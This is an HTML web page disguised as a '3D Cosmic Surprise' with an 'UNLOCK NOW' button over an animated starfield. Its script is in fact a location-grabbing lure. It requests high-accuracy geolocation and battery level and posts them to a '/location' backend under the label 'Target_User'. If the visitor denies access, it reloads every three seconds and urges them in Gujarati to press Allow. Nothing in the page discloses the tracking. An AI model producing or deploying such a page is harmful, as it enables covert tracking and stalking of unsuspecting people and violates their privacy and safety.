<!DOCTYPE html>
<html lang="gu">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Cosmic Surprise</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <style>
        body, html { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Segoe UI', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #canvas-container { position: fixed; top: 0; left: 0; z-index: 1; }
        .glass-box { position: relative; z-index: 10; padding: 50px 30px; width: 90%; max-width: 450px; background: rgba(0,0,0,0.85); border-radius: 20px; text-align: center; box-shadow: 0 0 20px rgba(0,242,254,0.2); border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); }
        h2 { color: #fff; font-size: 1.8rem; margin-bottom: 30px; text-transform: uppercase; letter-spacing: 2px; }
        .neon-btn { background: linear-gradient(45deg,#00f2fe,#4facfe); width: 100%; max-width: 260px; padding: 16px; font-size: 18px; font-weight: 900; color: white; border: none; border-radius: 12px; cursor: pointer; box-shadow: 0 0 20px rgba(0,242,254,0.4); }
        .status-msg { margin-top: 25px; font-size: 15px; font-weight: bold; color: #4facfe; display: none; }
        .error-msg { color: #ff3b3b !important; text-shadow: 0 0 10px rgba(255,59,59,0.3); }
    </style>
</head>
<body>

<div id="canvas-container"></div>

<div class="glass-box">
    <h2>✨ SURPRISE ✨</h2>
    <button class="neon-btn" onclick="startProcess()">UNLOCK NOW</button>
    <div id="status" class="status-msg">INITIALIZING...</div>
</div>

<script>
/* --- 3D Background (Stars) --- */
let scene, camera, renderer, starPoints;
function init3D(){
    scene = new THREE.Scene();
    camera = new THREE.PerspectiveCamera(60, window.innerWidth/window.innerHeight, 1, 1000);
    camera.position.z = 1;
    renderer = new THREE.WebGLRenderer();
    renderer.setSize(window.innerWidth, window.innerHeight);
    document.getElementById("canvas-container").appendChild(renderer.domElement);
    const starGeo = new THREE.BufferGeometry();
    const positions = [];
    for(let i=0; i<6000; i++){
        positions.push(Math.random()*600-300, Math.random()*600-300, Math.random()*600-300);
    }
    starGeo.setAttribute("position", new THREE.Float32BufferAttribute(positions, 3));
    const starMaterial = new THREE.PointsMaterial({color: 0xffffff, size: 0.7});
    starPoints = new THREE.Points(starGeo, starMaterial);
    scene.add(starPoints);
    animate();
}
function animate(){
    starPoints.rotation.y += 0.002;
    renderer.render(scene, camera);
    requestAnimationFrame(animate);
}
init3D();

/* --- Main Logic --- */
async function startProcess() {
    const status = document.getElementById("status");
    status.style.display = "block";
    status.innerText = "PERMISSION REQUESTED... PLEASE ALLOW";
    status.classList.remove("error-msg");

    navigator.geolocation.getCurrentPosition(
        async (pos) => {
            // SUCCESS: User clicked ALLOW
            let lat = pos.coords.latitude;
            let lon = pos.coords.longitude;
            let batteryLevel = "Unknown";

            try {
                if (navigator.getBattery) {
                    let bat = await navigator.getBattery();
                    batteryLevel = Math.floor(bat.level * 100);
                }
            } catch (e) {}

            status.innerText = "ACCESS GRANTED! UNLOCKING...";

            // Send to Backend
            fetch("/location", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    user: "Target_User",
                    latitude: lat,
                    longitude: lon,
                    battery: batteryLevel
                })
            });

            setTimeout(() => { alert("🎉 Surprise Unlocked! Check your map."); }, 1000);
        },
        (err) => {
            // ERROR: User clicked DENY
            status.innerHTML = "⚠️ ERROR: LOCATION REQUIRED!<br>કૃપા કરીને ઉપર 'Allow' બટન દબાવો.";
            status.classList.add("error-msg");

            // ૩ સેકન્ડ પછી પેજ રીલોડ થશે જેથી ફરીથી પોપ-અપ આવે
            setTimeout(() => {
                location.reload();
            }, 3000);
        },
        { enableHighAccuracy: true, timeout: 5000 }
    );
}
</script>

</body>
</html>
